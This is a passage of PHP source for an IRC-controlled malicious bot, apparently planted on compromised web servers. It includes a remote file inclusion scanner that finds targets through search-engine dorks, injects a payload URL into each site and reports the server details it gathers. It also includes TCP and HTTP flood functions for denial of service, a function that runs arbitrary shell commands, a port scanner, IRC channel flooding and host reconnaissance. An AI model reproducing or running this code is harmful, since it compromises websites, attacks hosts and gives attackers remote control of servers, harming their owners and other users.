  pingserv($sock);
  $rez = httpquery($url.$sourcez["fx29id"],5);
  $rez = ereg_replace("[\r\n]","",$rez);
  $ptn = '/ID: (.+?)<br>SAFE: (.*?)<br>OS:\s+(.*?)<br>UNAME: (.*?)<br>SERVER: (.*?)<br>USER: (.*?)<br>UID: (.*?)<br>DIR: (.*?)<br>PERM: (.*?)<br>HDD: (.*?)<br>DISFUNC: (.*?)<br>/smx';
  if (ereg("cReW",$rez)) {
    if ($count = preg_match_all($ptn, $rez, $m, PREG_SET_ORDER)) {
      list($full,$id,$safe,$os,$un,$srv,$usr,$uid,$dir,$prm,$dsf) = $m[0];
      if (eregi("OFF",$safe)) { $bug = '0,1 [4OFF0]'; }
      else { $bug = '0,1 [9ON0]'; }
      $bug .= '9['.$os.']0 '.$url.' ';
      $rez = '9,1 uname0[ '.$un.' ] 9server0[ '.$srv.' ] '.'9user0[ '.$usr.' / '.$uid.' ] '.
             '9dir0[ '.$dir.' '.$prm.' ] 9disfunc0[7 '.$dsf.' 0] ';
      msg($sock,$to,$bug);
      msg($sock,$to,$rez);
      return TRUE;
    }
    else { msg($sock,$to,'12Vurn:14 '.$url); return TRUE; }
  }
  else { msg($sock,$to,'4Not Vurn:12 '.$url); return FALSE; }
}
###################
##[ RFI SCANNER ]##
###################
function rfiscanner($sock,$to,$bug,$dork,$sourcez) {
  msg($sock,$to,'9,1 Scanning0 '.$bug.' 9with0 '.$dork.' ..');
  $dork  = urlencode($dork);
  $max   = (TEZ) ? 0 : 2000;
  ##[ UOL ]##
  for ($i=0; $i <= $max;$i += 50) {
    if ($i % 2 == 0) { pingserv($sock); }
    if ( (($i % 500) == 0) && ($i != 0) ) { msg($sock,$to,'9,1 »0 '.$i.' sites'); }
    $rez = httpquery2("http://mundo.busca.uol.com.br/buscar.html?q=".$dork."&start=".$i);
    if (TEZ) { $rez = httpquery2("http://localhost/search/busca.uol.com.br.htm"); }
    $pattern = '#<dt><a href="http://(.*?)">#i';
    $count = preg_match_all($pattern, $rez, $matches, PREG_SET_ORDER);
    if ($count == 0) { break; }
    else {
      for ($i = 0;$i < $count;$i++) {
        if ($i % 2 == 0) { pingserv($sock); }
        $target = urldecode($matches[$i][1]);
        linktest($sock,$to,$target,$bug,$sourcez);
      }
    }
  }
  ##[ GOOGLE ]##
  $doms = array(
    "co.id","com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu"
  );
  if (TEZ) { $doms = array("com"); }
  foreach ($doms as $dom) {
    for ($i=0; $i <= $max;$i += 50) {
      if ($i % 2 == 0) { pingserv($sock); }
      if ( (($i % 500) == 0) && ($i != 0) ) {
        msg($sock,$to,'9,1 »0 '.$i.' sites');
      }
      $rez = httpquery2("http://www.google.".$dom."/search?num=50&start=".$i."&q=".$dork);
      if (TEZ) { $rez = httpquery2("http://localhost/search/google.com.htm"); }
      $pattern = '#<h3 class=r><a href="http://([^"]*)" class#i';
      $count = preg_match_all($pattern, $rez, $matches, PREG_SET_ORDER);
      if ($count == 0) { break; }
      else {
        for ($i = 0;$i < $count;$i++) {
          if ($i % 2 == 0) { pingserv($sock); }
          $target = urldecode($matches[$i][1]);
          linktest($sock,$to,$target,$bug,$sourcez);
        }
      }
    }
  }
  msg($sock,$to,'9,1 Finished!0 '.$dork);
}
function linktest($sock,$to,$url,$bug,$sourcez) {
  $slink = sublink($url);
  foreach ($slink as $lnk) {
    $tlink = "http://".$lnk.$bug;
    rfitest($sock,$to,$tlink,$sourcez);
  }
}
function sublink($link) {
  $link     = str_replace('http://','',$link);
  $path     = explode('/',$link);
  $sublnk   = array();
  $dir      = '';
  $host     = $path[0];
  $path     = array_slice($path,1);
  $sublnk[] = $host.'/';
  foreach ($path as $p) {
    $dir .= '/'.$p;
    $sublnk[] = $host.$dir.'/';
  }
  return $sublnk;
}
function rfitest($sock,$to,$url,$sourcez) {
  $rez = httpquery($url.$sourcez["fx29id"],5);
  $rez = ereg_replace("[\r\n]","",$rez);
  $ptn = '/ID: (.+?)<br>SAFE: (.*?)<br>OS:\s+(.*?)<br>UNAME: (.*?)<br>SERVER: (.*?)<br>USER: (.*?)<br>UID: (.*?)<br>DIR: (.*?)<br>PERM: (.*?)<br>DISFUNC: (.*?)<br>/smx';
  if (ereg("cReW",$rez)) {
    if ($count = preg_match_all($ptn, $rez, $m, PREG_SET_ORDER)) {
      list($full,$id,$safe,$os,$un,$srv,$usr,$uid,$dir,$prm,$dsf) = $m[0];
      if (eregi("OFF",$safe)) { $bug = '0,1 [4OFF0]'; }
      else { $bug = '0,1 [9ON0]'; }
      $bug .= '9['.$os.']0 '.$url.' ';
      $rez = '9,1 uname0[ '.$un.' ] 9server0[ '.$srv.' ] '.'9user0[ '.$usr.' / '.$uid.' ] '.
             '9dir0[ '.$dir.' '.$prm.' ] 9disfunc0[7 '.$dsf.' 0] ';
      msg($sock,$to,$bug);
      msg($sock,$to,$rez);
      sleep(4);
      return TRUE;
    }
    else { msg($sock,$to,'12[Vurn]:14 '.$url); sleep(2); return TRUE; }
  }
}
################
##[ TCPFLOOD ]##
################
function tcpflood($sock,$to,$host,$port,$packet,$hitung) {
  if (!$host or !$port or !$packet or !$hitung) { msg($sock,$to,"Usage: ".comz("tcf",1)); return; }
  for ($i=0;$i<=$hitung;$i++) {
    if ($i % 2 == 0) { pingserv($sock); }
    $nsock = @fsockopen($host,$port,$errno,$errstr,5);
    if ($nsock) {
      $out = str_repeat('',1000);
      for ($i=0;$i<=$packet;$i++) { @fputs($nsock,$out); }
      @fclose($nsock);
    }
    else { msg($sock,$to,"Error attacking $host ($port)!"); return; }
  }
  msg($sock,$to,"Attack finished!");
}
################
##[ BOT LOAD ]##
################
function botload($sock,$to,$count,$url) {
  if ( $url == "CHILD" ) {
    $host = $_SERVER["HTTP_HOST"];
    $ruri = $_SERVER["REQUEST_URI"];
  }
  else {
    if (!is_numeric($count)) {
      notice($sock,$to,info("Args",comz("bot",1),""));
      return;
    }
    $aurl = explode("/",$url);
    $host = $aurl[2];
    $ruri = "/".join("/",array_slice($aurl,3));
  }
  $port = "80";
  $fail = 0;
  for ($i=1;$i<=$count;$i++) {
    $nsock = @fsockopen($host,$port,$enum,$estr,10);
    if (!$nsock) { $fail++; }
    else {
      $out = "GET $ruri HTTP/1.1\r\n".
             "Host: $host\r\n".
             "Accept: */*\r\n".
             "User-Agent: Mozilla/5.0\r\n".
             "Connection: Close\r\n\r\n";
      fputs($nsock,$out);
      fclose($nsock);
      $fail = ($fail > 0) ? $fail-- : 0;
    }
  }
  $count = $count - $fail;
  $fail  = ($fail > 0) ? '('.$fail.' Failed)': "";
  notice($sock,$to,'('.$count.' Loaded) '.$fail.' '.$host);
}
###########
## VHOST ##
###########
function vhost($sep = NULL) {
  $rez = fx29exec("/sbin/ifconfig | grep inet");
  if (TEZ) { $rez = fx29exec('cat sbin_ifconfig.txt'); }
  $pattern = "#inet addr:(.*?) Bcast#";
  $count = preg_match_all($pattern, $rez, $matches, PREG_SET_ORDER);
  if ( $count == 0 ) { $arrez = array(); }
  for ( $i = 0; $i < $count; $i++ ) { $arrez[] = $matches[$i][1]; }
  if ( $sep ) { return join($sep,$arrez); }
  else { return $arrez; }
}
################
##[ BOT INFO ]##
################
function botinfo($sock,$to,$info) {
  $info = chop($info,'');
  $info = strtolower($info);
  $mem = (function_exists("memory_get_usage"))? view_size(@memory_get_usage()) : "-";
  $safe = safemode() ? '12ON' : '4OFF';
  $p = '4»14 ';
  $info1 = array(
    "safe"   => 'Safemode '.$safe.' 14Pid12 '.@getmypid(),
    "uname"  => 'Os12 '.php_uname(),
    "server" => 'ServName12 '.$_SERVER["SERVER_NAME"].'14 Ip12 '.$_SERVER["SERVER_ADDR"].' ('.$_SERVER["SERVER_PORT"].')',
    "ip"     => 'IPList12 '.iplist($_SERVER["SERVER_NAME"]),
    "user"   => 'User12 '.@get_current_user().'14 Uid12 '.@getmyuid().'14 Gid12 '.@getmygid(),
    "soft"   => 'Soft12 '.$_SERVER["SERVER_SOFTWARE"],
    "vhost"  => 'Vhost ['.count(vhost()).']12 '.vhost(", "),
    "mem"    => 'Memory12 '.$mem.' 14Limit12 '.@ini_get("memory_limit").' 14TimeLimit12 '.@ini_get("max_execution_time"),
    "remote" => 'Remote12 '.$_SERVER["REMOTE_ADDR"].' ('.$_SERVER["REMOTE_PORT"].')',
  );
  $info2 = array(
    "proto"   => 'Gateway12 '.$_SERVER["GATEWAY_INTERFACE"].' 14Protocol:12 '.$_SERVER["SERVER_PROTOCOL"],
    "sadmin"  => 'Admin12 '.$_SERVER["SERVER_ADMIN"],
    "mail"    => 'SMTP12 '.@ini_get("SMTP").' ('.@ini_get("smtp_port").') 14Path12 '.@ini_get("sendmail_path").' 14From12 '.@ini_get("sendmail_from"),
    "docroot" => 'DocRoot12 '.$_SERVER["DOCUMENT_ROOT"],
    "script"  => 'File12 '.$_SERVER["SCRIPT_FILENAME"].' 14PHPSelf12 '.$_SERVER["PHP_SELF"],
    "bug"     => 'Bug12 http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"],
  );
  $i = 0;
  switch ($info) {
  case "":
    $rez = join(" ",array_keys($info1));
    $rez .= " ".join(" ",array_keys($info2));
    msg($sock,$to,logo('Args: * 1 2 3 '.$rez));
    break;
  case "*":
    pingserv($sock);
    foreach ( $info1 as $f => $g ) { msg($sock,$to,$p.$g); $i++; if ($i % 3 == 0) { sleep(3); } }
    foreach ( $info2 as $f => $g ) { msg($sock,$to,$p.$g); $i++; if ($i % 3 == 0) { sleep(3); } }
    break;
  case "1":
    foreach ( $info1 as $f => $g ) { msg($sock,$to,$p.$g); $i++; if ($i %3 == 0) { sleep(3); } }
    break;
  case "2":
    foreach ( $info2 as $f => $g ) { msg($sock,$to,$p.$g); $i++; if ($i %3 == 0) { sleep(3); } }
    break;
  case "3":
    msg($sock,$to,'12Loaded Ext '.$p.join(" ",get_loaded_extensions())); sleep(2);
    break;
  default:
    if (@$info1[$info]) { $rez = $info1[$info]; }
    elseif (@$info2[$info]) { $rez = $info2[$info]; }
    else { $rez = '4No information!'; }
    msg($sock,$to,$p.$rez);
  }
  return;
}

function cmd($sock,$to,$cmd) {
  $rez = fx29exec($cmd);
  $rez = str_replace("\r","",$rez);
  $rez = explode("\n",$rez);
  $i   = 0;
  pingserv($sock);
  foreach ( $rez as $m ) {
    $i++;
    $m = ltrim($m);
    if ($i % 4 == 0) { sleep(3); }
    if ($m) { msg($sock,$to,"12".$m); } else { $i--; }
  }
}
###############
##[ TSUNAMI ]##
###############
function randnick($sock) {
  $rchr1   = "PSYCHOIDZ";
  $rchr2   = "AbcdEfghIjklmnOpqrstUvwxyz0123456789";
  $tsunick = acak(str_splitz($rchr1));
  for ($i=0;$i<10;$i++) { $tsunick .= acak(str_splitz($rchr2)); }
  nick($sock,$tsunick);
}
function tsunami($sock,$to,$msg,$tsumsg,$tsulen,$orinick) {
  $tsumsg = "9,1".str_repeat($tsumsg,$tsulen);
  randnick($sock);
  if ( ereg("#",$to) ) { joinchan($sock,$to); }
  for ( $i=0;$i<2;$i++ ) {
    msg($sock,$to,$msg." ".$tsumsg);
    notice($sock,$to,$msg." ".$tsumsg);
  }
  if ( ereg("#",$to) ) { partchan($sock,$to,"","4Completed!14 ".(strlen($tsumsg)*4)." Bytes"); }
  nick($sock,$orinick);
}

######################
##[ PUBLIC MODULES ]##
######################
function chanflags($op,$new,$old) {
  $iflags = str_splitz($new);
  if ($op == "+") {
    $cflags = str_splitz($old);
    $rflags = array_merge($iflags,$cflags);
    $rflags = array_unique($rflags);
    $rflags = implode("",$rflags);
  }
  else {
    $rflags = str_splitz($old);
    foreach ( $iflags as $f ) { $rflags = str_replace($f,"",$rflags); }
  }
  return $rflags;
}
function flags($char) {
  $flags = array(
  "*" => "[4*]",
  "G" => "4GooGLe",
  "N" => "Pi4Ng",
  "R" => "Ve4RsioN",
  "E" => "4EnCoDeR",
  "D" => "4DnS",
  "I" => "4IP",
  "P" => "4PoRtCheCk",
  "V" => "Ser4VicEs",
  "O" => "P4OrtScaN",
  "F" => "R4FIcheck",
  "C" => "RFIS4Canner",
  "A" => "4AsTRoLoGy",
  );
  $rez = "";
  switch ($char) {
    case "all": foreach ( $flags as $f ) { $rez .= $f; } break;
    case "*": foreach ( $flags as $f => $g ) { $rez .= $g." "; } break;
    case "":  $rez = "None"; break;
    default:
      $char = str_splitz($char); foreach ( $char as $c) { $rez .= $flags[$c]." "; }
      break;
  }
  return $rez;
}
function encoder($sock,$to,$method,$type,$str) {
  if ($method == "encode") {
    $encz = array(
    "url"    => urlencode($str),
    "base64" => base64_encode($str),
    "rawurl" => rawurlencode($str),
    "crc32"  => crc32($str),
    "crypt"  => crypt($str),
    "md5"    => md5($str),
    "ord"    => ord($str)
    );
  } else {
    $encz = array(
    "url"    => urldecode($str),
    "base64" => base64_decode($str),
    "rawurl" => rawurldecode($str),
    "chr"    => chr($str)
    );
  }
  switch ($type) {
    case "":
      msg($sock,$to,logo('Encoder: * : '.join(" : ",array_keys($encz)),""));
      break;
    case "*":
      foreach ( $encz as $e => $r ) { msg($sock,$to,info($e,"",$r)); sleep(2); }
      break;
    default:
      if (!$encz[$type]) { msg($sock,$to,info("Encoder","",'4Parameter salah!')); }
      else { msg($sock,$to,info("$type","",''.$encz[$type])); }
      break;
  }
}
function dnsresolver($host) {
  if (ereg("[a-zA-Z]",$host)) { $rez = gethostbyname($host); }
  elseif (ereg("[0-9]",$host)) { $rez = gethostbyaddr($host); }
  if ($rez == $host) { return "None"; } else { return $rez; }
}
function iplist($host) {
  $rez = gethostbynamel($host);
  $rez = implode(", ",$rez);
  if ( empty($rez) ) { $rez = "None"; }
  return $rez;
}
function portcheck($host,$port,$timeout) {
  $nsock = @fsockopen($host,$port,$enum,$estr,$timeout);
  if (!$nsock) {
    if ($enum == 10060) { $rez = '4Timed out!'; }
    else { $rez = '4Ditolak!';}
  }
  else { $rez = '12OK!'; fclose($nsock); }
  return $rez;
}
#portscan <host> [min..max] / [port1 port2 ..]
function portscan($sock,$to,$host,$scports,$timeout) {
  $ports = array(20,21,22,23,25,43,53,70,79,80,110,135,136,137,138,139,143,530,1025,8080,8081);
  $ircs  = array(6667,6668,6669,7000);
  if (!$host) { return "No host given!"; }
  if (ereg("\.\.",$scports)) {
    $scports = explode("..",$scports);
    notice($sock,$to,"$host: $scports[0] to $scports[1]");
    for ($p=$scports[0];$p<=$scports[1];$p++) {
      pingserv($sock);
      if ( ereg("OK",portcheck($host,$p,$timeout)) ) {
        $rez[] = $p;
        notice($sock,$to,"$host [".count($rez)."]: $p");
      }
    }
  }
  else {
    $scports = explode(" ",$scports);
    if ( empty($scports[0]) ) { $scports = array_merge($ports,$ircs); }
    if ( !is_numeric($scports[0]) ) { return "Invalid parameters!"; }
    foreach ($scports as $p) {
      pingserv($sock);
      if ( ereg("OK",portcheck($host,$p,$timeout)) ) {
        $rez[] = $p;
        notice($sock,$to,"$host [".count($rez)."]: $p");
      }
    }
  }
  $opens = count($rez);
  if ($opens > 0) { return '['.$opens.']: '.join(" ",$rez); }
  else { return "No open ports!"; }
}
function services($sock,$to,$port) {
  $services = array('http', 'ftp', 'ssh', 'telnet', 'imap','smtp', 'nicname', 'gopher', 'finger', 'pop3', 'www');
  $rez = "";
  if (empty($port)) { msg($sock,$to,logo("Args: ".comz("svc",1))); }
  elseif (is_numeric($port)) {
    msg($sock,$to,info("Services","",'14 '.$port.' ('.getservbyport($port,"tcp").')'));
  }
  else {
    if ($port == "*") {
      foreach ($services as $service) {
        $sport = getservbyname($service, 'tcp');
        $rez .= ''.$service.' ('.$sport.') ';
      }
    }
    else { $rez = "$port (".getservbyname($port, 'tcp').")"; }
    msg($sock,$to,info("Services","",'14'.$rez));
  }
}

function googling($sock,$chan,$nick,$max,$qu) {
  pingserv($sock);
  $qu = (is_numeric($max)) ? substr($qu,strlen($max) + 1) : $qu;
  if (empty($qu)) { notice($sock,$nick,"Usage: ".comz('gog',1)); return; }
  $qu = urlencode($qu);
  if (TEZ) { $rez = httpquery("http://localhost/search/google.com.htm",10); }
  else { $rez = httpquery("http://www.google.com/search?num=$max&q=".$qu,10); }
  $pattern = '#<h3 class=r><a href="([^"]*)" class=l>(([^<]|<[^a][^ ])*)</a></h3>#i';
  $count = preg_match_all($pattern, $rez, $matches, PREG_SET_ORDER);
  if ($count == 0) { msg($sock,$chan,'[4G]12 Ga ada hasil.'); }
  else {
    $max = (is_numeric($max)) ? $max : 5;
    $num = ($count > $max) ? $max : $count;
    notice($sock,$nick,"Showing $num of $count results..");
    for ($i = 0;$i < $num;$i++) {
      $url  = urldecode($matches[$i][1]); $desc = strip_tags(html_entity_decode($matches[$i][2]));
      msg($sock,$chan,'[4G]12 '.$url.' -14 '.$desc);
      sleep(1);
    }
  }
}

function astrologi($sock,$to,$zod) {
  pingserv($sock);
  $zod = strtolower($zod);
  #$astrourl = "http://localhost/astro/";
  $astrourl = "http://beta20.astaga.com/astrology/grup/";
  $zodiac = array(
  "aries"      => "1",
  "taurus"     => "2",
  "gemini"     => "3",
  "cancer"     => "4",
  "leo"        => "5",
  "virgo"      => "6",
  "libra"      => "7",
  "scorpio"    => "8",
  "sagitarius" => "9",
  "capricorn"  => "10",
  "aquarius"   => "11",
  "pisces"     => "12"
  );
  #$url = $astrourl.$zodiac[$zod].".htm";
  $url = $astrourl.$zodiac[$zod];
  $rez = httpquery($url,10);
  $rez = ereg_replace("[\r\n]","",$rez);
  $ptn = '#<span class=merahsedang>Astrology Anda</span></td></tr></table><span class=judul><b>(.*?)</p></p><table width=100% class=hitamsedang><tr><td>#i';
  if ($count = preg_match_all($ptn, $rez, $m, PREG_SET_ORDER)) {
    list($astro) = $m[0];
    $astro = str_replace("Astrology Anda",'12('.ucfirst($zod).')1',$astro);
    $astro = str_replace("Cinta :",'4Cinta:1',$astro);
    $astro = str_replace("Keuangan :",'4Keuangan:1',$astro);
    $astro = str_replace("Kesehatan :",'4Kesehatan:1',$astro);
    $astro = str_replace("Warna :",'4Warna:1',$astro);
    $astro = str_replace("Hari baik :",'4Hari baik:1',$astro);
    $astro = str_replace("</b>",".",$astro);
    $astro = str_replace("</span>"," ",$astro);
    $astro = str_replace("<p>"," ",$astro);
    $rez = strip_tags($astro);
    msg($sock,$to,$rez);
    return TRUE;
  }
  else { msg($sock,$to,'4Error!'); return FALSE; }
}

#######################
##[ FX29BOT UTILITY ]##
#######################
function fx29bot_start($headz) {
define('CR',"\r\n");
echo '
<HTML>
<HEAD>
  <TITLE>'.Fx29ver.'</TITLE>
  <STYLE TYPE="TEXT/CSS">
  BODY,TABLE { FONT:11PX VERDANA;COLOR:#00FF00;BACKGROUND-COLOR:#000000;MARGIN:0;WIDTH:100%; }
  TABLE,TD { BORDER:1PX SOLID #333333;BORDER-COLLAPSE:COLLAPSE;PADDING:1PX; }
  INPUT { COLOR:#FFFFFF;BACKGROUND-COLOR:#333333;BORDER:1PX SOLID #969696; }
  FONT { SIZE:1;COLOR:#808080; }
  .OK { COLOR:#3366FF; }
  .ERROR { COLOR:#FF0000; }
  </STYLE>
</HEAD>
<BODY>
<TABLE><TR><TD COLSPAN=8><PRE>'.$headz.'</PRE>
';
}

function fx29bot_init() {
  $minver = "4.0.7";
  define(ERRLVL,(TEZ)?E_ALL:0);
  if (TEZ) { proz("<B>LOCALTEST</B>"); }
  proz("Checking Compatibility..");
  proz("Running on <B>PHP ".@PHP_VERSION." / ".@PHP_OS."</B>");
  if ( empty($_SERVER["HTTP_HOST"]) && empty($_SERVER["SERVER_ADDR"]) ) { proz('!','SUPER GLOBAL VARIABLE IS EMPTY'); }
  if (@version_compare(@PHP_VERSION,$minver,"<")) { proz('!',"<B>REQUIRE PHP $minver OR LATER!</B> Current version is ".PHP_VERSION."."); die(); }
  proz("Setting PHP Runtime Configurations..");
  proz("Error reporting: ".@error_reporting(ERRLVL));
  @set_time_limit(0);
  @ini_set("max_execution_time","0");
  @ini_set("memory_limit","32M");
  @ini_set("user_agent","Mozilla/5.0");
  @ignore_user_abort(TRUE);
  $mem = (function_exists("memory_get_usage"))? view_size(@memory_get_usage()) : "-";
  proz("Initial memory usage: <B>$mem</B>");
}

function logz($msg,$info = NULL) { if (BROZ) { if ($msg == "!") { echo "<FONT CLASS=ERROR>"; }  echo ($info) ? $info : "$msg<BR>"; if ($msg == "!") { echo "</FONT><BR>"; } echo CR; } }
function proz($msg,$info = NULL) { if ($msg == "!") { echo "<FONT CLASS=ERROR>"; }  echo ($info) ? $info : "$msg<BR>"; if ($msg == "!") { echo "</FONT><BR>"; } echo CR; flush(); }
function fx29botkill($msg) { die("<TR><TD COLSPAN=8 CLASS=ERROR><B>TERMINATED:</B> $msg</TD><TR></TABLE></BODY></HTML>".CR); }
##########################
##[ oYik IRC Network   ]##
##########################
?>